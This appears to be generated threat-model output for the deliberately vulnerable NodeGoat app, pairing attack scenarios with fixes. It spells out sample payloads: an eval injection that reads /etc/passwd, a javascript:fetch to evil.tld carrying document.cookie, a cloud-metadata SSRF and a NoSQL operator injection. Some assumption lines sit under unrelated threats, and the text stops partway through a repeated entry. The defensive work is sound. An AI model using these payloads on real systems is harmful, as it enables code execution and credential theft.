threats.asset: the NodeGoat application server process and all data it can reach (SSN, bank account numbers, memos)
threats.attackScenario: An attacker logs in, then posts to /contributions with preTax=require('child_process').execSync('cat /etc/passwd').toString() (or a reverse-shell payload); app/routes/contributions.js:32-34 passes the raw body fields straight to eval(), so the payload executes with the Node process's privileges and the attacker gains remote code execution on nodegoat-web.
threats.impactReason: Arbitrary code execution in the app process exposes the MongoDB connection, all user SSNs, bank routing/account numbers and allows full server takeover.
threats.likelihoodReason: Any self-registered, logged-in user can reach POST /contributions and the payload is a plain form field; exploitation requires no special position.

mitigation.summary: Replace eval() with numeric parsing for the contribution fields.
steps: In app/routes/contributions.js:32-34 use parseInt(req.body.preTax, 10) (the commented-out fix) instead of eval().
Reject values that are NaN, negative, or outside the 0-30 range before calling contributionsDAO.update.
Add a lint rule (no-eval) to the existing grunt/eslint config to prevent reintroduction.

threats.title: Unauthenticated repudiation of login and profile changes due to unattributable console-only logging
threats.asset: audit trail for authentication and profile/benefit changes
threats.attackScenario: An attacker who has taken over an account posts to /profile and /benefits to alter SSN and benefit start dates; the only record produced anywhere in app/routes is console.log of failed logins in app/routes/session.js:64 and the console.error in app/routes/error.js:7-8, so no timestamped, attributable record of the successful change exists and the account holder cannot prove the change was not theirs.
assumptions: No external audit logging or reverse-proxy access log records request bodies or the acting session user for state-changing routes.
threats.impactReason: Fraudulent changes to SSN, bank details and benefit dates cannot be attributed or reconstructed during an investigation.
threats.likelihoodReason: Every state-changing route in the app writes no audit record, so the gap applies to all authenticated abuse, though it requires prior account access.

mitigation.summary: Add structured, attributable audit logging for authentication and state-changing routes.
steps: Log session userId, route, timestamp and outcome for POST /login, /signup, /profile, /contributions, /benefits and /memos.
Sanitise user-controlled values before logging (node-esapi is already a dependency) to stop CRLF log forging as noted in app/routes/session.js:66-80.
Ship logs to an append-only destination outside the application host.

threats.title: Any logged-in user can read another user's retirement allocations via GET /allocations/:userId
threats.asset: other users' retirement allocation records (stocks, funds, bonds percentages)
threats.attackScenario: An attacker registers an account, notes that their own link is /allocations/3, and then requests /allocations/1, /allocations/2 and so on; app/routes/index.js:63 applies only isLoggedIn and app/routes/allocations.js:16-18 takes userId from req.params rather than req.session, so every other user's allocation data is returned.
assumptions: User ids are sequential integers generated by the counters collection, making neighbouring ids guessable.
threats.impactReason: Financial allocation records for every account become readable one id at a time, though credentials themselves are not exposed.
threats.likelihoodReason: Self-registration is open and enumerating integer ids in the URL path needs no tooling beyond a browser.

mitigation.summary: Derive the allocations owner from the session instead of the URL parameter.
steps: In app/routes/allocations.js replace `const { userId } = req.params;` with `const { userId } = req.session;` as the commented fix indicates.
If an admin view is needed, add sessionHandler.isAdminUserMiddleware to the /allocations/:userId route in app/routes/index.js:63.

threats.title: Catastrophic regex backtracking on the bankRouting field stalls the event loop
threats.asset: availability of the NodeGoat web application for all users
threats.attackScenario: An attacker logs in and posts to /profile with bankRouting set to a long digit string with no '#' terminator (e.g. 40 '1' characters); the nested-quantifier pattern /([0-9]+)+\#/ at app/routes/profile.js:59 backtracks exponentially, pinning the single Node event loop and making every route unresponsive.
threats.impactReason: A single request blocks the single-threaded Node process, taking the whole application offline for every user until it is restarted.
threats.likelihoodReason: Any registered user can submit the profile form and the payload is trivially constructed; no throttling stands in front of POST /profile.

mitigation.summary: Remove the nested quantifier from the bank routing validation regex.
steps: Change the pattern at app/routes/profile.js:59 to /^[0-9]+\#$/ as the surrounding comment suggests.
Cap the length of req.body.bankRouting (e.g. 32 characters) before running the test.

threats.title: Unvalidated redirect on GET /learn sends users from a trusted link to an attacker-controlled site
threats.asset: user trust in redirect destination and the credentials users type into the spoofed login page
threats.attackScenario: The handler at app/routes/index.js:70-72 returns res.redirect(req.query.url) with no allow-list, so an attacker mails a link such as https://nodegoat.example/learn?url=https://nodegoat-login.evil.tld, the victim's browser follows the 302 out across the trust boundary to the attacker's cloned NodeGoat login page, and the victim's NodeGoat username and password are captured there.
threats.impactReason: A phished NodeGoat credential yields the account's SSN, date of birth and bank account and routing numbers held in the users collection.
threats.likelihoodReason: The redirect target is taken verbatim from a query parameter; crafting and sending the link needs no special position, only a logged-in victim who clicks it.

mitigation.summary: Map the url parameter to a server-side allow-list of learning-resource destinations instead of redirecting to raw request input.
steps: In app/routes/index.js replace `res.redirect(req.query.url)` with a lookup of `req.query.url` against a constant object of permitted keys to absolute URLs, and return 400 when the key is unknown.
If full URLs must be supported, parse them with the Node `url` module and reject any whose host is not in an explicit allowed-host list.
Add an interstitial page warning the user when leaving the application.

threats.title: Missing security response headers let the /learn redirect and its referring pages be framed and abused for cross-origin phishing
threats.asset: user trust in redirect destination
threats.attackScenario: With helmet commented out in server.js and no Content-Security-Policy, X-Frame-Options or Referrer-Policy set, an attacker embeds the NodeGoat /learn link in an iframe on their own page so the 302 to their external target happens inside a trusted-looking frame, and the outbound Referer also leaks the internal NodeGoat URL and query string to the external target.
assumptions: No reverse proxy in front of the application adds Content-Security-Policy, X-Frame-Options or Referrer-Policy headers.
threats.impactReason: Framing plus referrer leakage strengthens phishing against the redirect and exposes internal URLs and query parameters to the external destination.
threats.likelihoodReason: Any attacker-hosted page can frame the application and no user privilege is needed to trigger the redirect.

mitigation.summary: Enable the helmet middleware already declared in package.json and set frame, CSP and referrer policies.
steps: Uncomment `const helmet = require("helmet")` and the helmet middleware block in server.js.
Add `app.use(helmet.frameguard({action: "deny"}))`, `app.use(helmet.contentSecurityPolicy(...))` and a `Referrer-Policy: no-referrer` header.
Call `app.disable("x-powered-by")`.

threats.title: No validation of the url query parameter on GET /learn lets crafted schemes be reflected into the Location header
threats.asset: the redirect Location header returned to the user's browser
threats.attackScenario: GET /learn at app/routes/index.js:70 reads req.query.url with no validation library applied in the handler, so an attacker supplies /learn?url=javascript:fetch('https://evil.tld/'+document.cookie) or a protocol-relative //evil.tld value and the unchecked string is placed straight into the 302 Location header sent to the victim's browser.
assumptions: No validation or normalisation of req.query.url happens in middleware mounted ahead of the /learn route in server.js.
threats.impactReason: A non-http scheme or protocol-relative target in the Location header can run attacker script in the application origin on lenient clients or silently move the user off-site.
threats.likelihoodReason: The parameter is directly attacker-controlled on a route any logged-in user can reach, but modern browsers reject some of the abusive schemes.

mitigation.summary: Validate the url parameter's shape and scheme before it reaches res.redirect.
steps: In app/routes/index.js parse req.query.url with the Node `url` module and reject anything whose protocol is not exactly https: and whose host is not on the allowed-host list.
Reject values beginning with `//` or containing control characters before building the Location header.

threats.title: Attacker-chosen destination on the research outbound flow lets the server fetch internal endpoints (SSRF)
threats.asset: internal-only HTTP endpoints and cloud instance metadata reachable from the app server
threats.attackScenario: The outbound needle.get on this flow builds its URL as req.query.url + req.query.symbol at app/routes/research.js:15-16, so an authenticated attacker requests GET /research?url=http://169.254.169.254/latest/meta-data/&symbol=iam/security-credentials/ and the server makes the request from inside the trust boundary, turning the flow into a pivot into the internal network rather than a call to finance.yahoo.com.
threats.impactReason: The destination of the outbound flow is fully attacker-chosen, exposing metadata services, internal admin endpoints and localhost services that trust the app server's network position.
threats.likelihoodReason: Any user who can register and log in can set the hidden url field on the /research form; no special position or tooling is required.

mitigation.summary: Fix the outbound host on the research flow and pass only the encoded symbol.
steps: In app/routes/research.js:15, drop req.query.url entirely and build the URL from a constant base such as `https://finance.yahoo.com/quote/` plus encodeURIComponent(req.query.symbol).
Validate req.query.symbol against a strict pattern (e.g. /^[A-Z.\-]{1,10}$/) before it is appended.
Remove the hidden url input from app/views/research.html:17 so the destination is never client-supplied.
If multiple upstreams are genuinely needed, resolve a caller-supplied key against a server-side allow-list map of full URLs.

threats.title: No Content-Security-Policy on the research response lets fetched third-party content load attacker scripts freely
threats.asset: fetched third-party content rendered to users and the authenticated session it executes alongside
threats.attackScenario: The response that carries this flow's fetched body is emitted with only a Content-Type header at app/routes/research.js:18-20 and the app sets no security response headers, so an attacker whose payload is returned through /research?url=... has no CSP script-src or frame-ancestors to block inline script execution or framing of the result page in the victim's browser.
assumptions: No reverse proxy in front of the deployed app injects Content-Security-Policy or X-Frame-Options headers.
threats.impactReason: Absent CSP removes the last containment layer for any script that reaches the research response, so injected script runs with full session access.
threats.likelihoodReason: Exploitation still needs a victim to open a crafted /research URL, but the missing header applies to every response on this flow.

mitigation.summary: Enable the already-declared helmet middleware and set a restrictive CSP covering the research response.
steps: Uncomment and register helmet in server.js (helmet is already a dependency at package.json:16), including contentSecurityPolicy, frameguard and noSniff.
Define script-src 'self' with no 'unsafe-inline' so bodies returned through app/routes/research.js cannot execute inline script.
Ensure the manual res.writeHead in app/routes/research.js:18 does not bypass middleware-set headers.

threats.title: Third-party response body from the research flow is written unescaped into the user's page
threats.asset: user session state and the SSN, bank account and routing numbers reachable through an authenticated session
threats.attackScenario: The inbound side of this flow is echoed verbatim: res.write(body) at app/routes/research.js:25 with Content-Type text/html, so an attacker sends a victim a link to /research?url=https://attacker.example/payload.html&symbol=X and the attacker-hosted HTML with a <script> tag executes in the victim's authenticated NodeGoat origin, reading the session and submitting /profile to exfiltrate SSN and bank details.
assumptions: The fetched third-party body is not sanitised or escaped anywhere between needle's callback and the HTTP response.
threats.impactReason: Script executes in the application origin with the victim's session, giving full read/write access to profile data including SSN and bank routing numbers.
threats.likelihoodReason: Requires the victim to follow a crafted /research link while logged in, but the link is a plain GET URL and the payload host is entirely attacker-controlled.

mitigation.summary: Never render a fetched upstream body as HTML; parse it and render only extracted fields through the template engine.
steps: Replace res.write(body) at app/routes/research.js:25 with res.render("research", { ...extractedFields, environmentalScripts }) so swig escaping applies.
If raw passthrough is required, set Content-Type to text/plain and escape with node-esapi's encodeForHTML (already a dependency) before writing.
Restrict the upstream to the fixed finance host so the body is not attacker-authored.

threats.title: Attacker-chosen upstream on the research flow is used to hang or exhaust the app server
threats.asset: availability of the NodeGoat web application to legitimate users
threats.attackScenario: Because the flow's destination comes from req.query.url at app/routes/research.js:15 and needle.get is called with no timeout or response size limit, an attacker repeatedly requests /research?url=http://attacker.example/slowloris&symbol=X pointing at a host that trickles bytes forever, pinning sockets and buffering unbounded bodies until the Express process stops serving other users.
assumptions: No rate limiting or lockout is applied, so login and signup are assumed to be brute-forceable without restriction.
No request timeout, response size cap or concurrency limit is applied to outbound needle calls or to the /research route.
threats.impactReason: Sustained slow or oversized upstream responses tie up server sockets and memory, degrading availability for all users of the single Express process.
threats.likelihoodReason: Any logged-in user can issue repeated /research requests naming an attacker-controlled slow host; no exploit primitive is needed. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Bound the outbound research request in time and size and cap concurrent use of the route.
steps: Pass needle options at app/routes/research.js:16 such as { open_timeout: 2000, response_timeout: 5000, read_timeout: 5000 }.
Abort and return an error once the accumulated body exceeds a fixed byte limit instead of writing it through.
Limit concurrent /research requests per session in app/routes/index.js:76.

threats.title: Hardcoded express-session cookie secret allows forging of session cookies and admin impersonation
threats.asset: session identifiers and the admin role flag reached through req.session.userId
threats.attackScenario: server.js:82 initialises express-session with `secret: cookieSecret` taken from the literal value committed at config/env/all.js:8, so an attacker who reads the repository signs their own connect.sid cookie carrying a userId of a known admin account and then requests admin routes, where isAdminUserMiddleware (app/routes/session.js:25) trusts req.session.userId unconditionally.
assumptions: The deployed instance uses the committed config/env/all.js cookieSecret rather than overriding it from the environment.
The repository or its image is reachable by the attacker.
threats.impactReason: A forged session grants the admin role flag and thereby access to every user's SSN, DOB and bank details.
threats.likelihoodReason: The secret is a source literal with no rotation, and signing a cookie requires only the express-session signing scheme.

mitigation.summary: Load the session secret from the environment and rotate the committed value.
steps: Change config/env/all.js:8 to `cookieSecret: process.env.COOKIE_SECRET` with no fallback literal and fail startup if it is unset.
Rotate the secret so all existing cookies signed with the committed value are invalidated.
Regenerate the session id on successful login in app/routes/session.js handleLoginRequest using req.session.regenerate.

threats.title: Session cookies are transmitted over plain HTTP without httpOnly or secure flags
threats.asset: session identifiers of logged-in users
threats.attackScenario: server.js:145 serves the app with http.createServer and the session cookie options block at server.js:92-100 is commented out, so an attacker on the same network captures the connect.sid cookie sent with POST /login credentials in cleartext, or reads it from document.cookie via any of the app's XSS sinks, and replays it to act as the victim.
assumptions: No TLS termination exists anywhere in front of nodegoat-web, so credentials and session cookies are assumed to travel in plaintext.
No TLS-terminating reverse proxy sits in front of the Express server in the deployment.
threats.impactReason: A captured session cookie gives full access to the victim's profile including SSN, DOB and bank details.
threats.likelihoodReason: Credentials and cookies traverse the network in cleartext on every /login request; any network-adjacent observer succeeds. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the application over HTTPS and set secure, httpOnly and sameSite cookie flags.
steps: Uncomment the https.createServer block at server.js:149-155 and supply real certificates, or terminate TLS at a proxy and set app.set('trust proxy', 1).
Add `cookie: { httpOnly: true, secure: true, sameSite: 'lax', maxAge: ... }` to the session options at server.js:78.
Redirect all plain HTTP requests to HTTPS.

threats.title: Unthrottled POST /login permits credential brute force against 1-20 character passwords
threats.asset: user accounts and the admin role flag
threats.attackScenario: POST /login (app/routes/index.js:34) calls userDAO.validateLogin with no attempt counter or lockout, and validateSignup in app/routes/session.js:144 accepts any password matching /^.{1,20}$/, so an attacker scripts thousands of POSTs per minute with a common-password list against a known userName and obtains a valid session; the distinct "Invalid username" versus invalid-password messages at lines 85-92 first confirm which accounts exist.
assumptions: No rate limiting or WAF is applied in front of the Express server in the deployment.
No rate limiting or lockout is applied, so login and signup are assumed to be brute-forceable without restriction.
threats.impactReason: A guessed password yields full access to the victim's profile data and, for an admin account, to all users' benefits and PII.
threats.likelihoodReason: The login route is unauthenticated and Internet-facing, weak passwords are permitted, and username enumeration narrows the search. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Add per-account and per-IP login throttling and a uniform authentication error message.
steps: Introduce express-rate-limit (or an equivalent counter in Mongo) on POST /login in app/routes/index.js with progressive delay and temporary lockout per userName.
Return the single errorMessage variable already defined at app/routes/session.js:59 for both the noSuchUser and invalidPassword branches.
Enforce the stronger PASS_RE regex commented at app/routes/session.js:148.

threats.title: Login attempts and privilege checks are not attributably logged, so credential attacks cannot be reconstructed
threats.asset: audit trail of authentication and admin-role decisions
threats.attackScenario: app/routes/session.js logs only console.log lines for redirects and invalid usernames (lines 31, 40, 64) with no record of successful POST /login, of who received admin access from isAdminUserMiddleware, or of the source address, so an attacker who brute-forces or replays a session cookie leaves no evidence that identifies the account used or the time of access.
assumptions: No external logging or reverse-proxy access log records authentication outcomes for this deployment.
threats.impactReason: Account takeover of accounts holding SSN and bank details could not be detected or attributed after the fact.
threats.likelihoodReason: Any authentication abuse of the exposed /login route goes unrecorded by default; no attacker effort is needed to remain unlogged.

mitigation.summary: Emit structured authentication audit events for login success, failure and admin authorisation.
steps: In app/routes/session.js handleLoginRequest, log a structured event with userName, outcome, req.ip and timestamp for both success and failure paths, sanitising CRLF in userName as the comments at lines 66-80 describe.
Log a denial event in isAdminUserMiddleware at app/routes/session.js:25 when user.isAdmin is false.
Ship these events to a store outside the application host.

threats.title: Tutorial pages are served over plaintext HTTP, allowing an on-path attacker to rewrite them and harvest credentials
threats.asset: session cookie and user credentials entered on the same origin
threats.attackScenario: server.js:145 starts the application with http.createServer(app) and the HTTPS block at server.js:149-155 is commented out, so the responses for GET /tutorial and GET /tutorial/a1 (app/routes/tutorial.js:8 and :31) travel in cleartext; an attacker on the same Wi-Fi rewrites the tutorial HTML in transit to add a script or a fake login form pointing at their host, and captures the visitor's session cookie and login credentials for the RetireEasy app.
assumptions: No TLS termination exists anywhere in front of nodegoat-web, so credentials and session cookies are assumed to travel in plaintext.
No TLS-terminating reverse proxy or load balancer is placed in front of the Express server in the deployed environment.
threats.impactReason: Injected content on the application origin can steal the session cookie and phish credentials for accounts holding personal financial data.
threats.likelihoodReason: Any network position between visitor and server suffices, and the tutorial pages are fetched by unauthenticated visitors over untrusted networks. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve all traffic, including /tutorial, over HTTPS and force upgrades.
steps: Re-enable the https.createServer(httpsOptions, app) block in server.js:149-155 or terminate TLS at a proxy and redirect all HTTP requests to HTTPS.
Re-enable helmet.hsts() (server.js:54) so browsers refuse plaintext connections to the origin on subsequent visits.
Set cookie.secure and cookie.httpOnly on the express-session configuration at server.js:78-102 once HTTPS is in place.

threats.title: Tutorial responses carry no security response headers, letting the pages be framed or MIME-sniffed
threats.asset: public educational content and the session cookie of visitors on the same origin
threats.attackScenario: The helmet middleware in server.js:38-65 (frameguard, contentSecurityPolicy, noCache, dont-sniff-mimetype) is entirely commented out and app.disable("x-powered-by") is not executed, so the responses from GET /tutorial/a1 (app/routes/tutorial.js:31) ship without X-Frame-Options, Content-Security-Policy or X-Content-Type-Options; an attacker embeds /tutorial in a hidden iframe on their own site to clickjack navigation into the authenticated RetireEasy area, and any injected script on the origin runs unconstrained because no CSP restricts script sources.
assumptions: No reverse proxy adds security response headers in front of the Express application.
threats.impactReason: Absent CSP removes the last defence against the unescaped-template XSS on the same origin, and framing enables clickjacking of authenticated actions.
threats.likelihoodReason: The pages are unauthenticated and trivially framed or fetched by any attacker-controlled page.

mitigation.summary: Re-enable helmet with frameguard, CSP and nosniff for all routes including /tutorial.
steps: Uncomment the helmet require at server.js:10 and the app.use(helmet.frameguard()), helmet.contentSecurityPolicy() and nosniff() calls in server.js:38-65.
Define an explicit CSP with script-src 'self' so the vendor bootstrap and theme assets referenced by app/views/tutorial/layout.html still load.
Uncomment app.disable("x-powered-by") at server.js:42 to stop advertising the Express framework.

threats.title: Tutorial pages rendered by swig with autoescape disabled provide a stored/reflected XSS surface in the shared template layer
threats.asset: session cookie of any visitor browsing /tutorial pages
threats.attackScenario: server.js:135-142 calls swig.setDefaults({autoescape:false}) for the whole consolidate/swig engine that also renders the tutorial views (app/views/tutorial/a1.html etc. via res.render in app/routes/tutorial.js:10 and :33), so any value interpolated into a tutorial or shared layout template with {{ }} — for example the environmentalScripts entries injected into app/views/tutorial/layout.html — is emitted raw, letting an attacker who can influence that value (e.g. an operator-supplied or injected script entry) execute JavaScript in every visitor's browser and read the non-httpOnly session cookie configured at server.js:78-102.
assumptions: At least one value rendered into the tutorial templates (such as environmentalScripts) can be influenced by an attacker or by untrusted configuration.
threats.impactReason: Script executing on the application origin can read the session cookie, which lacks httpOnly, and act as the victim against authenticated routes.
threats.likelihoodReason: The unauthenticated /tutorial routes are reachable by anyone, but exploitation depends on an attacker-controllable value reaching the unescaped template.

mitigation.summary: Enable swig autoescaping so tutorial templates escape interpolated values by default.
steps: Change swig.setDefaults({ autoescape: false }) to autoescape: true in server.js:135.
Mark the few templates that legitimately need raw HTML with an explicit |safe filter rather than disabling escaping globally.
Re-render app/views/tutorial/*.html and app/views/tutorial/layout.html to confirm the tutorial markup still displays correctly with escaping on.

threats.title: Forged cross-site requests ride the End User's cookie session because no CSRF token protects state-changing routes
threats.asset: the victim's profile and contribution records (SSN, bank account and routing numbers, contribution percentages)
threats.attackScenario: server.js:104-113 leaves app.use(csrf()) commented out even though csurf is a declared dependency, so an attacker hosts a page that auto-submits a form to POST /profile; when the logged-in End User visits it the browser attaches the connect.sid cookie and the victim's bank account and routing numbers are silently overwritten, after which the attacker browses /allocations/:userId to confirm the session is live.
assumptions: The session cookie is sent on cross-site POSTs because no SameSite attribute is configured on it.
threats.impactReason: An attacker can rewrite the victim's banking and contribution data without ever seeing their credentials.
threats.likelihoodReason: Only requires the victim to visit an attacker page while logged in; no privileged position needed.

mitigation.summary: Enable CSRF tokens on all cookie-authenticated state-changing routes.
steps: Uncomment the csurf setup at server.js:104-113 so app.use(csrf()) runs after the session middleware.
Render {{csrftoken}} as a hidden field in the profile, contributions, memos and login forms under app/views/.
Set cookie sameSite: 'lax' in the express-session options at server.js:78 as defence in depth.

threats.title: Allocations responses are rendered with Swig autoescaping disabled and no CSP, so stored values can execute script in the End User's browser
threats.asset: session cookie and personal financial data rendered in the allocations page
threats.attackScenario: server.js:135-142 sets swig autoescape:false and the helmet/CSP middleware at server.js:38-65 is commented out, so an attacker who lands a script payload in a value rendered by the allocations view (via res.render("allocations", { userId, allocations }) in app/routes/allocations.js:25) has it executed in the victim's browser and exfiltrates the connect.sid cookie, which carries no httpOnly flag.
assumptions: At least one value reaching the allocations template originates from user-supplied data rather than purely numeric DAO output.
threats.impactReason: Script running in the victim's page can read the session cookie and the displayed SSN/bank details and act as the user.
threats.likelihoodReason: Template escaping is globally off and no CSP backstop exists, but a concrete injection sink into this view must be reached first.

mitigation.summary: Re-enable Swig autoescaping and add security response headers.
steps: Set autoescape: true in the swig.setDefaults call at server.js:135-142.
Uncomment and enable helmet at server.js (contentSecurityPolicy, frameguard, hsts, noSniff) using the helmet dependency already listed in package.json:16.
Set cookie: { httpOnly: true } in the express-session options at server.js:78.

threats.title: Attacker-controlled threshold query parameter on GET /allocations/:userId flows unvalidated into the allocations query
threats.asset: allocation records returned by getByUserIdAndThreshold
threats.attackScenario: app/routes/allocations.js:19-23 reads req.query.threshold and hands it straight to allocationsDAO.getByUserIdAndThreshold with no type check or numeric coercion, so an attacker requests /allocations/1?threshold[$gt]= or a crafted object/string value to alter the predicate the DAO builds and change which allocation documents are returned.
assumptions: getByUserIdAndThreshold interpolates the threshold value into a Mongo query or expression without casting it to a number, since no validation happens at the route layer.
threats.impactReason: A manipulated predicate can widen the result set to allocation rows the caller should not see, or break the query path.
threats.likelihoodReason: The query string is trivially attacker-controlled by any logged-in user, but exploitation depends on how the DAO consumes the value.

mitigation.summary: Validate and coerce threshold to a bounded number before it reaches the DAO.
steps: In app/routes/allocations.js, parse threshold with Number() and reject NaN or out-of-range values with a 400 response.
Ensure the DAO passes the threshold as a typed query operand rather than building the query from a string.
Reject non-string query values (Express parses bracket syntax into objects) before use.

threats.title: Insecure direct object reference on GET /allocations/:userId lets any logged-in user read other users' fund allocations
threats.asset: other users' stock, fund and bond allocation records
threats.attackScenario: app/routes/index.js:63 mounts GET /allocations/:userId behind isLoggedIn only, and app/routes/allocations.js:16-23 takes userId straight from req.params and passes it to allocationsDAO.getByUserIdAndThreshold without comparing it to req.session.userId, so an attacker registers an account, then requests /allocations/1, /allocations/2 and so on to enumerate every employee's allocation percentages.
assumptions: User ids are sequential integers, as suggested by the getNextSequence counter used for _id.
threats.impactReason: Every user's financial allocation record is readable one id at a time by any account holder.
threats.likelihoodReason: A self-registered account and a URL edit are all that is needed; the parameter is directly attacker-controlled.

mitigation.summary: Derive the allocations owner from the session rather than the URL.
steps: Apply the fix already sketched at app/routes/allocations.js:12-15: read const { userId } = req.session instead of req.params.
If an admin view is genuinely needed, gate the :userId variant with sessionHandler.isAdminUserMiddleware in app/routes/index.js:63.
Return 404 for ids the caller does not own so existence is not confirmed.

threats.title: Unbounded allocations requests and the ReDoS-prone profile regex let a logged-in user stall the single Express process
threats.asset: availability of the RetireEasy web application for all users
threats.attackScenario: No rate limiting sits in front of the Express app, so an attacker with one registered account loops GET /allocations/:userId?threshold= across many ids while also posting a bankRouting value like '99999999999999999999x' to POST /profile, where the catastrophic-backtracking pattern /([0-9]+)+\#/ at app/routes/profile.js:59 pins the single Node event loop and the site stops serving other users.
assumptions: No rate limiting or lockout is applied, so login and signup are assumed to be brute-forceable without restriction.
No reverse proxy or API gateway applies request rate limiting in front of the Node process.
The application runs as a single Node process, as started by `node server.js` in package.json.
threats.impactReason: A single-threaded Node process blocked in regex backtracking makes the whole application unavailable to every user.
threats.likelihoodReason: Any self-registered account can send the requests, though the attacker must first authenticate. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Add request rate limiting and remove the catastrophic backtracking pattern.
steps: Replace the regex at app/routes/profile.js:59 with the non-nested /([0-9]+)\#/ already noted in the comment above it.
Add an express rate-limiting middleware in server.js applied to /login, /signup and the authenticated routes.
Cap the number of allocation lookups per session per minute.

threats.title: Cross-site request forgery on POST /benefits lets an attacker rewrite any employee's benefit start date
threats.asset: employee benefit start dates in the benefits collection
threats.attackScenario: An attacker publishes a page that auto-submits a form with userId and benefitStartDate fields to http://<nodegoat>/benefits; a logged-in employee who loads it has their cookie attached, and benefitsHandler.updateBenefits (app/routes/benefits.js:35) writes the attacker-chosen date for the attacker-chosen userId without a token check.
assumptions: No CSRF token is validated by middleware in front of the /benefits POST route in the deployed application.
threats.impactReason: Benefit start dates for arbitrary employees can be silently altered, which is an integrity loss on financial entitlement records.
threats.likelihoodReason: The route accepts a simple urlencoded POST with cookie authentication, so any lured logged-in user completes the attack.

mitigation.summary: Enable CSRF tokens and add the role check on the benefits POST route.
steps: Enable the csurf middleware stubbed in server.js and render the token in app/views/benefits.html.
Apply the isAdmin middleware to app.post("/benefits", ...) at app/routes/index.js:56 as the commented fix at lines 57-60 shows.
Set SameSite on the session cookie in server.js.

threats.title: POST /benefits carries an administrative userId over plaintext HTTP
threats.asset: the express-session cookie and employee benefit records
threats.attackScenario: A network observer on the path between the browser and the Express server started by http.createServer(app) in server.js:145 reads the cleartext POST /benefits body and the accompanying session cookie, then replays that cookie to submit further benefit updates as the victim.
assumptions: No TLS termination exists anywhere in front of nodegoat-web, so credentials and session cookies are assumed to travel in plaintext.
No TLS-terminating reverse proxy sits in front of the Node process in the deployed environment.
threats.impactReason: A captured session cookie allows impersonation of a user who can modify any employee's benefit record.
threats.likelihoodReason: Needs a network vantage point, but the flow crosses a trust boundary unencrypted and the cookie lacks the secure flag. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Terminate the application on HTTPS and harden the session cookie.
steps: Enable the commented https.createServer block in server.js and drop the plain HTTP listener.
Set cookie: { httpOnly: true, secure: true } in the express-session configuration in server.js.
Enable helmet.hsts() so browsers refuse later plaintext requests.

threats.title: Missing security response headers on the /benefits page allow clickjacking of the benefit update form
threats.asset: employee benefit start dates shown and edited on the benefits page
threats.attackScenario: With no X-Frame-Options or frame-ancestors directive on the response to POST /benefits, an attacker embeds the /benefits form in a transparent iframe over a decoy page and induces a logged-in employee to click the submit button, writing an attacker-chosen benefitStartDate for a chosen userId.
assumptions: No reverse proxy adds X-Frame-Options or Content-Security-Policy headers in front of the Express app.
threats.impactReason: Benefit records for other employees can be altered without the victim realising they submitted anything.
threats.likelihoodReason: The headers are absent on all responses and the form is reachable by any logged-in user, but the attack needs a convincing lure.

mitigation.summary: Send framing and content-security headers via helmet.
steps: Uncomment the helmet block in server.js and enable helmet.frameguard() and helmet.contentSecurityPolicy() with frame-ancestors 'none'.
Add helmet.noCache() so the benefits page holding employee data is not stored by browsers.
Verify headers appear on POST /benefits responses with a test.

threats.title: Cross-site request forgery forces a victim's contribution update and eval() payload on POST /contributions
threats.asset: the victim's contribution percentages and the server process reached through eval()
threats.attackScenario: An attacker hosts a page with an auto-submitting form posting preTax/afterTax/roth to http://<nodegoat>/contributions; a logged-in victim who visits it has their session cookie attached by the browser, so the request is accepted as theirs and the attacker-chosen string is evaluated in app/routes/contributions.js with the victim's session.
assumptions: No CSRF token is validated by middleware in front of the /contributions POST route in the deployed application.
threats.impactReason: The forged request both rewrites the victim's retirement contribution values and delivers attacker-controlled text into eval() under the victim's session.
threats.likelihoodReason: Cookie sessions are sent automatically on cross-site form posts and the route takes simple urlencoded fields, so a single lured page click is enough.

mitigation.summary: Enable CSRF token validation for all state-changing POST routes.
steps: Uncomment and enable the csurf middleware already declared in package.json and stubbed in server.js (app.use(csrf())) plus the res.locals.csrftoken helper.
Render the token as a hidden input in app/views/contributions.html and the other POST forms.
Set the session cookie SameSite attribute to 'lax' or 'strict' in the express-session options in server.js.

threats.title: POST /contributions and its response travel over plaintext HTTP, exposing the session cookie
threats.asset: the express-session cookie and the submitted contribution percentages
threats.attackScenario: A network attacker on the same Wi-Fi as an employee reads the cleartext POST /contributions request created by http.createServer(app) in server.js:145, copies the connect.sid cookie (the secure and httpOnly cookie options are commented out at server.js:95-99), and replays it to act as that user.
assumptions: No TLS termination exists anywhere in front of nodegoat-web, so credentials and session cookies are assumed to travel in plaintext.
No TLS-terminating reverse proxy sits in front of the Node process in the deployed environment.
threats.impactReason: A stolen session cookie gives full access to the victim's profile data including SSN, date of birth and bank details.
threats.likelihoodReason: Requires a network position, but the flow crosses a trust boundary in cleartext and the cookie carries no secure flag. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the application over HTTPS and mark the session cookie secure.
steps: Enable the commented-out https.createServer block in server.js and remove the plain http.createServer listener.
Set cookie: { httpOnly: true, secure: true, sameSite: 'lax' } in the express-session options in server.js.
Add HSTS via the helmet dependency already listed in package.json.

threats.title: Missing security response headers let injected content in the contributions response run in the victim's browser
threats.asset: the session cookie and contribution percentages displayed on the contributions page
threats.attackScenario: Because no Content-Security-Policy or X-Frame-Options header is sent on the POST /contributions response, an attacker frames the contributions page to trick a logged-in employee into submitting a change, or has any script echoed into the re-rendered contributions template execute unrestricted and exfiltrate the session cookie.
assumptions: No reverse proxy adds Content-Security-Policy or X-Frame-Options headers in front of the Express app.
threats.impactReason: Absent CSP and framing headers remove the browser-side containment for script execution and clickjacking on a page that holds financial data.
threats.likelihoodReason: The page is reachable by any logged-in user and the headers are absent on every response, though exploitation needs a second injection or a lure.

mitigation.summary: Enable helmet to set CSP, frameguard and nosniff headers.
steps: Uncomment the helmet require and app.use(helmet...) block in server.js, using the helmet dependency already in package.json.
Configure helmet.contentSecurityPolicy with a script-src that excludes 'unsafe-inline'.
Call app.disable('x-powered-by') as the commented fix shows.

threats.title: Server-side JavaScript injection through POST /contributions preTax field reaching eval()
threats.asset: the NodeGoat application server process and the MongoDB data it holds (SSN, bank account numbers, contribution percentages)
